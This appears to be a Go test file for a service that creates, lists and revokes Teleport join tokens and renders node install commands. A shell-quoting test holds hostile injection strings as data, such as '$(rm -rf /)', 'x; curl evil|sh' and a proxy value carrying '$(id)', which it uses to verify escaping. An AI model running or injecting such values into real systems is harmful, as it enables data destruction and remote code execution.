package tokens_test

import (
	"context"
	"crypto/sha256"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/gravitational/trace"
	"gopkg.in/yaml.v3"

	"github.com/go-tangra/go-tangra-teleport/v4/internal/authz"
	"github.com/go-tangra/go-tangra-teleport/v4/internal/clusters"
	ct "github.com/go-tangra/go-tangra-teleport/v4/internal/clusters/clusterstest"
	"github.com/go-tangra/go-tangra-teleport/v4/internal/events"
	"github.com/go-tangra/go-tangra-teleport/v4/internal/repo"
	"github.com/go-tangra/go-tangra-teleport/v4/internal/secrets"
	"github.com/go-tangra/go-tangra-teleport/v4/internal/teleportapi"
	"github.com/go-tangra/go-tangra-teleport/v4/internal/tokens"
)

var (
	admin    = ct.As(ct.TenantA, ct.Admin)
	operator = ct.As(ct.TenantA, ct.Operator)
	viewer   = ct.As(ct.TenantA, ct.Viewer)
)

func setup(t *testing.T) (*ct.Env, *tokens.Service, string) {
	t.Helper()
	e := ct.New(t, nil)
	c := e.Register(t, ct.TenantA, "prod")
	return e, &tokens.Service{Clusters: e.Service, Repo: e.Repo, Audit: e.Audit, Events: e.Events, Now: e.Now}, c.ID
}

func ttl(n int) *int { return &n }

func reveal(t *testing.T, c tokens.Created) (token, command, snippet string) {
	t.Helper()
	b, err := json.Marshal(c)
	if err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	_ = json.Unmarshal(b, &m)
	return m["token"].(string), m["install_command"].(string), m["config_snippet"].(string)
}

func lastAudit(t *testing.T, e *ct.Env, action string) repo.AuditRow {
	t.Helper()
	e.Audit.Flush(context.Background())
	rows := e.Repo.Audit()
	for i := len(rows) - 1; i >= 0; i-- {
		if rows[i].Action == action {
			return rows[i]
		}
	}
	t.Fatalf("no %s audit row in %v", action, e.AuditRows())
	return repo.AuditRow{}
}

// TTL defaults to 30 minutes and is bounded to 1 minute .. 24 hours.
func TestTTLBounds(t *testing.T) {
	e, s, id := setup(t)
	c, err := s.Create(operator, id, tokens.CreateInput{ResourceType: repo.KindNode})
	if err != nil {
		t.Fatal(err)
	}
	if !c.ExpiresAt.Equal(e.Now().Add(30 * time.Minute)) {
		t.Fatalf("default expiry %v (now %v)", c.ExpiresAt, e.Now())
	}
	for _, n := range []int{1, 1440} {
		c, err := s.Create(admin, id, tokens.CreateInput{ResourceType: repo.KindNode, TTLMinutes: ttl(n)})
		if err != nil || !c.ExpiresAt.Equal(e.Now().Add(time.Duration(n)*time.Minute)) {
			t.Fatalf("ttl %d: %v %v", n, c.ExpiresAt, err)
		}
	}
	for _, n := range []int{0, -5, 1441} {
		_, err := s.Create(admin, id, tokens.CreateInput{ResourceType: repo.KindNode, TTLMinutes: ttl(n)})
		var fe *clusters.FieldError
		if !errors.As(err, &fe) || fe.Field != "ttl_minutes" {
			t.Fatalf("ttl %d: %v", n, err)
		}
	}
	if e.Teleport.TokenCount() != 3 {
		t.Fatalf("%d tokens on the cluster", e.Teleport.TokenCount())
	}
}

// Each resource type gets the matching Teleport system role.
func TestRolePerResourceType(t *testing.T) {
	e, s, id := setup(t)
	for kind, role := range map[string]string{repo.KindNode: teleportapi.RoleNode, repo.KindApp: teleportapi.RoleApp,
		repo.KindDB: teleportapi.RoleDB, repo.KindKube: teleportapi.RoleKube, repo.KindDesktop: teleportapi.RoleDesktop} {
		c, err := s.Create(admin, id, tokens.CreateInput{ResourceType: kind})
		if err != nil {
			t.Fatalf("%s: %v", kind, err)
		}
		tok, _, _ := reveal(t, c)
		if err := e.Teleport.Join(tok, role, e.Now()); err != nil {
			t.Fatalf("%s token does not join as %s: %v", kind, role, err)
		}
		for _, other := range teleportapi.JoinRoles {
			if other != role && e.Teleport.Join(tok, other, e.Now()) == nil {
				t.Fatalf("%s token also joins as %s", kind, other)
			}
		}
	}
	_, err := s.Create(admin, id, tokens.CreateInput{ResourceType: "auth"})
	var fe *clusters.FieldError
	if !errors.As(err, &fe) || fe.Field != "resource_type" {
		t.Fatalf("unknown type: %v", err)
	}
}

// The token and its command come back once; only the name hash is stored,
// and nothing else (list, audit, events, printing) carries the value.
func TestTokenReturnedOnceHashStored(t *testing.T) {
	e, s, id := setup(t)
	c, err := s.Create(admin, id, tokens.CreateInput{ResourceType: repo.KindNode, TTLMinutes: ttl(5)})
	if err != nil {
		t.Fatal(err)
	}
	tok, cmd, snip := reveal(t, c)
	if len(tok) != 64 || !strings.Contains(cmd, tok) || !strings.Contains(snip, tok) {
		t.Fatalf("token %q command %q", tok, cmd)
	}
	rows, _ := e.Repo.ListJoinTokens(context.Background(), ct.TenantA, id)
	sum := sha256.Sum256([]byte(tok))
	if len(rows) != 1 || string(rows[0].TokenHash) != string(sum[:]) || rows[0].ResourceType != repo.KindNode || rows[0].CreatedBy != ct.Admin {
		t.Fatalf("stored %+v", rows)
	}
	page, err := s.List(operator, id)
	if err != nil {
		t.Fatal(err)
	}
	listed, _ := json.Marshal(page)
	printed := fmt.Sprintf("%v %+v %#v %s", c, c, c, c.Token)
	e.Audit.Flush(context.Background())
	audited, _ := json.Marshal(e.Repo.Audit())
	published, _ := json.Marshal(e.Events.All())
	for name, out := range map[string]string{"list": string(listed), "print": printed, "audit": string(audited), "events": string(published)} {
		if strings.Contains(out, tok) {
			t.Errorf("%s carries the token", name)
		}
	}
	if len(page.Items) != 1 || page.Items[0].ID != c.ID || page.Items[0].Revoked {
		t.Fatalf("list %+v", page)
	}
	row := lastAudit(t, e, "teleport.token.create")
	if row.Outcome != "success" || row.TargetName != c.ID || row.Detail["resource_type"] != repo.KindNode {
		t.Fatalf("audit %+v", row)
	}
	if ev := e.Events.OfType(events.TokenCreated); len(ev) != 1 || ev[0].Payload.(events.Token).TokenID != c.ID {
		t.Fatalf("events %+v", ev)
	}
}

// Revoking deletes the token in Teleport: a later join is refused.
func TestRevokeDeletesInTeleport(t *testing.T) {
	e, s, id := setup(t)
	c, _ := s.Create(admin, id, tokens.CreateInput{ResourceType: repo.KindNode})
	tok, _, _ := reveal(t, c)
	if err := s.Revoke(operator, id, c.ID); err != nil {
		t.Fatal(err)
	}
	if err := e.Teleport.Join(tok, teleportapi.RoleNode, e.Now()); err == nil {
		t.Fatal("a revoked token still joins")
	}
	page, _ := s.List(admin, id)
	if !page.Items[0].Revoked || page.Items[0].RevokedAt == nil {
		t.Fatalf("list after revoke %+v", page.Items[0])
	}
	if row := lastAudit(t, e, "teleport.token.revoke"); row.Outcome != "success" || row.TargetName != c.ID {
		t.Fatalf("audit %+v", row)
	}
	if len(e.Events.OfType(events.TokenRevoked)) != 1 {
		t.Fatal("no revoke event")
	}
	// Revoking again is a no-op; an expired token that Teleport already
	// dropped still revokes.
	if err := s.Revoke(admin, id, c.ID); err != nil {
		t.Fatalf("second revoke: %v", err)
	}
	c2, _ := s.Create(admin, id, tokens.CreateInput{ResourceType: repo.KindApp, TTLMinutes: ttl(1)})
	tok2, _, _ := reveal(t, c2)
	_ = e.Teleport.DeleteJoinToken(context.Background(), teleportapi.TokenHash(secrets.NewSecret([]byte(tok2))))
	if err := s.Revoke(admin, id, c2.ID); err != nil {
		t.Fatalf("revoke of a token Teleport dropped: %v", err)
	}
	// Unknown ids and other clusters' tokens are not found.
	if err := s.Revoke(admin, id, "018f3a2b-0000-7000-8000-0000000000ff"); !errors.Is(err, repo.ErrNotFound) {
		t.Fatalf("unknown token: %v", err)
	}
	other := e.Register(t, ct.TenantA, "staging")
	c3, _ := s.Create(admin, other.ID, tokens.CreateInput{ResourceType: repo.KindNode})
	if err := s.Revoke(admin, id, c3.ID); !errors.Is(err, repo.ErrNotFound) {
		t.Fatalf("another cluster's token: %v", err)
	}
	// A Teleport outage fails the revoke and keeps the token active.
	e.Teleport.FailNext("DeleteJoinToken", trace.ConnectionProblem(nil, "down"))
	if err := s.Revoke(admin, other.ID, c3.ID); !errors.Is(err, teleportapi.ErrUnreachable) {
		t.Fatalf("outage: %v", err)
	}
	row, _ := e.Repo.GetJoinToken(context.Background(), ct.TenantA, c3.ID)
	if !row.RevokedAt.IsZero() {
		t.Fatal("revoked_at set although Teleport kept the token")
	}
	if r := lastAudit(t, e, "teleport.token.revoke"); r.Outcome != "failure" || r.Reason != "cluster_unreachable" {
		t.Fatalf("failure audit %+v", r)
	}
}

// Install commands per resource type (research D9).
func TestInstallCommands(t *testing.T) {
	for _, c := range []struct {
		kind, cmd, service string
	}{
		{repo.KindNode, "curl -fsSL 'https://teleport.example.com/scripts/TOKEN/install-node.sh' | sudo bash", "ssh_service"},
		{repo.KindApp, "sudo teleport app start --token='TOKEN' --proxy='teleport.example.com:443'", "app_service"},
		{repo.KindDB, "sudo teleport db start --token='TOKEN' --proxy='teleport.example.com:443'", "db_service"},
		{repo.KindKube, "sudo teleport start --config=/etc/teleport.yaml", "kubernetes_service"},
		{repo.KindDesktop, "sudo teleport start --config=/etc/teleport.yaml", "windows_desktop_service"},
	} {
		out, err := tokens.Render(c.kind, "teleport.example.com:443", "TOKEN")
		if err != nil {
			t.Fatalf("%s: %v", c.kind, err)
		}
		if !strings.HasPrefix(out.Command, c.cmd) {
			t.Errorf("%s command %q", c.kind, out.Command)
		}
		var cfg map[string]any
		if err := yaml.Unmarshal([]byte(out.Config), &cfg); err != nil {
			t.Fatalf("%s config: %v\n%s", c.kind, err, out.Config)
		}
		tp := cfg["teleport"].(map[string]any)
		jp := tp["join_params"].(map[string]any)
		if cfg["version"] != "v3" || tp["proxy_server"] != "teleport.example.com:443" || jp["token_name"] != "TOKEN" || jp["method"] != "token" {
			t.Errorf("%s config %v", c.kind, cfg)
		}
		if svc, ok := cfg[c.service].(map[string]any); !ok || svc["enabled"] != true {
			t.Errorf("%s: %s not enabled in %v", c.kind, c.service, cfg)
		}
		if cfg["auth_service"].(map[string]any)["enabled"] != false || cfg["proxy_service"].(map[string]any)["enabled"] != false {
			t.Errorf("%s: auth or proxy enabled", c.kind)
		}
	}
	if _, err := tokens.Render("auth", "x:443", "T"); err == nil {
		t.Fatal("unknown type rendered")
	}
}

// The proxy address is single-quoted for the shell (and YAML-encoded): a
// hostile value cannot break out of the command.
func TestShellSafeQuoting(t *testing.T) {
	for in, want := range map[string]string{
		"plain":           "'plain'",
		"a'b":             `'a'\''b'`,
		"$(rm -rf /)":     "'$(rm -rf /)'",
		"x; curl evil|sh": "'x; curl evil|sh'",
		"":                "''",
	} {
		if got := tokens.ShellQuote(in); got != want {
			t.Errorf("ShellQuote(%q) = %q, want %q", in, got, want)
		}
	}
	out, err := tokens.Render(repo.KindApp, "evil'$(id):443", "TOKEN")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out.Command, `--proxy='evil'\''$(id):443'`) {
		t.Fatalf("command %q", out.Command)
	}
	var cfg map[string]any
	if err := yaml.Unmarshal([]byte(out.Config), &cfg); err != nil || cfg["teleport"].(map[string]any)["proxy_server"] != "evil'$(id):443" {
		t.Fatalf("config %v %v", cfg, err)
	}
	node, _ := tokens.Render(repo.KindNode, "evil'$(id):8443", "TOKEN")
	if !strings.Contains(node.Command, `'https://evil'\''$(id):8443/scripts/TOKEN/install-node.sh'`) {
		t.Fatalf("node command %q", node.Command)
	}
}

// Permissions: tokens:manage (administrator, operator); viewers are refused.
// Writes to an unsupported cluster are blocked; another tenant's cluster is
// not found.
func TestAccess(t *testing.T) {
	e, s, id := setup(t)
	if _, err := s.Create(viewer, id, tokens.CreateInput{ResourceType: repo.KindNode}); !errors.Is(err, authz.ErrForbidden) {
		t.Fatalf("viewer create: %v", err)
	}
	if _, err := s.List(viewer, id); !errors.Is(err, authz.ErrForbidden) {
		t.Fatalf("viewer list: %v", err)
	}
	if err := s.Revoke(viewer, id, "018f3a2b-0000-7000-8000-0000000000ff"); !errors.Is(err, authz.ErrForbidden) {
		t.Fatalf("viewer revoke: %v", err)
	}
	if _, err := s.Create(ct.As(ct.TenantB, ct.Admin), id, tokens.CreateInput{ResourceType: repo.KindNode}); !errors.Is(err, repo.ErrNotFound) {
		t.Fatalf("cross-tenant: %v", err)
	}
	c, _ := e.Repo.GetCluster(context.Background(), ct.TenantA, id)
	c.Status = repo.StatusUnsupportedVersion
	_, _ = e.Repo.UpdateCluster(context.Background(), c)
	if _, err := s.Create(admin, id, tokens.CreateInput{ResourceType: repo.KindNode}); !errors.Is(err, clusters.ErrUnsupportedVersion) {
		t.Fatalf("unsupported: %v", err)
	}
	if e.Teleport.TokenCount() != 0 {
		t.Fatal("a refused create reached Teleport")
	}
}

// A Teleport refusal fails the create with nothing stored; a store failure
// deletes the token again so no unrecorded token can join.
func TestCreateFailures(t *testing.T) {
	e, s, id := setup(t)
	e.Teleport.FailNext("CreateJoinToken", trace.AccessDenied("no token:create"))
	if _, err := s.Create(admin, id, tokens.CreateInput{ResourceType: repo.KindNode}); !errors.Is(err, teleportapi.ErrRejected) {
		t.Fatalf("teleport refusal: %v", err)
	}
	if r := lastAudit(t, e, "teleport.token.create"); r.Outcome != "failure" || r.Reason != "teleport_rejected" {
		t.Fatalf("audit %+v", r)
	}
	e.Repo.FailNext("CreateJoinToken")
	if _, err := s.Create(admin, id, tokens.CreateInput{ResourceType: repo.KindNode}); err == nil {
		t.Fatal("store failure ignored")
	}
	if e.Teleport.TokenCount() != 0 {
		t.Fatal("an unrecorded token stayed on the cluster")
	}
	if rows, _ := e.Repo.ListJoinTokens(context.Background(), ct.TenantA, id); len(rows) != 0 {
		t.Fatalf("rows %+v", rows)
	}
}
